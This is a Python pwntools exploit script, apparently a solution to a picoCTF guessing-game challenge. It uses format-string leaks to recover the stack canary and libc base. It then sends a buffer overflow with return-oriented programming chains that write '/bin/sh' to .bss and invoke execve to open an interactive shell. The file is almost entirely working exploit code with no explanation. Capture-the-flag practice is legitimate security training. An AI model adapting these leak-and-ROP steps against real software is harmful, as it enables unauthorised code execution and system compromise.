from pwn import *
import random


# if args.REMOTE:
#     r = remote("jupiter.challenges.picoctf.org", 18263)
#     ans = -3727
# elif args.LOCAL:
#     r = process("./vuln", env={"LD_PRELOAD" : "./libc-2.27.so"})
#     ans = -2527
# libc = ELF('./libc6_2.35-0ubuntu3.1_i386.so')
r = process("./V", env={"LD_PRELOAD" : "./libc-2.27.so"})
ans = -2527
'''#############
Find Libc address by stack info
#############'''
print(r.recvline())

r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')

'''
Find 50 stack info
'''
'''
for i in range(50):
    payload = b"%" + str(i+1).encode() + b"$p"
    r.sendline(payload)
    r.recvuntil(b"Congrats: ")
    if r.recv(2) != b'0x':
        success("(nil)")
    else:
        stack_info = int(r.recvuntil(b"\n").strip().decode(), 16)
        success(hex(stack_info))
    r.recvline()
    r.recvline()
    r.sendline(str(ans).encode())
    r.recvuntil(b'Name? ')
'''

'''#############
Find Canary Value
#############'''
# raw_input()
# r.sendline(b"%335$p") # canary
r.sendline(b"%135$p")
r.recvuntil(b"Congrats: 0x")
r.recv(2)
canary_value = int(r.recvuntil(b"\n").strip().decode()+"00", 16)
success(f"Canary Value = {hex(canary_value)}")
r.recvline(2)
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')

# raw_input()

'''#############
Write /bin/sh\x00 to .bss
#############'''
r.sendline(b"%75$p") # -> 0xf7e417eb -> _IO_file_write+43
r.recvuntil(b"Congrats: ")
__io_file_write_addr = int(r.recvuntil(b"\n").strip().decode(), 16) - 43
libc_addr = __io_file_write_addr - 0x07d4c0
libc_system_addr = libc_addr + 0x048150
libc_read_addr = libc_addr + 0x10a0f0
success("__io_file_write_addr = {}".format(hex(__io_file_write_addr)))
success("libc_addr = {}".format(hex(libc_addr)))
success("libc_system_addr = {}".format(hex(libc_system_addr)))
success("libc_read_addr = {}".format(hex(libc_read_addr)))

pop_eax_ret = 0x0002ed92 + libc_addr
pop_ebx_ret = 0x0002c01f + libc_addr
pop_ecx_edx_ret = 0x00037374 + libc_addr
xor_ecx_mov_eax_ecx_pop_ebx_pop_esi_ret = 0x0014c81e + libc_addr
pop_edx_ret = 0x00037375 + libc_addr
int_0x80 = 0x00037755 + libc_addr
main_fun_addr = 0x80493b6
write_2_bss = 0X804c008
push_eax_ret = 0x00036a7d + libc_addr

ROP_payload = flat(
    pop_eax_ret, 0x3,
    pop_ebx_ret, 0,
    pop_ecx_edx_ret, 
    write_2_bss, 0x9,
    libc_read_addr,
    main_fun_addr
)
# ROP_payload = flat(
#     pop_eax_ret, 0x68732f,
#     push_eax_ret,
#     pop_eax_ret, 0x6e69622f,
#     push_eax_ret,
# )

r.recvline(2)
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')
raw_input()
r.sendline(b'a' * (0x200) + p32(canary_value))# + b'a' * 0xc + ROP_payload
raw_input()
r.sendline(b'/bin/sh\x00')


'''#############
Get Shell
#############'''
raw_input()
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')

# Find another canary value
r.sendline(b"%335$p") # canary
r.recvuntil(b"Congrats: 0x")
r.recv(2)
canary_value = int(r.recvuntil(b"\n").strip().decode()+"00", 16)
success(f"Canary Value = {hex(canary_value)}")
r.recvline(2)
r.sendline(str(ans).encode())
r.recvuntil(b'Name? ')

raw_input()
ROP_payload = flat(
    pop_eax_ret, 0xb,
    pop_ebx_ret, write_2_bss,
    pop_ecx_edx_ret, 0, 0,
    int_0x80
)
r.sendline(b'a' * (0x200) + p32(canary_value) + b'a' * 0xc + ROP_payload)
r.interactive()
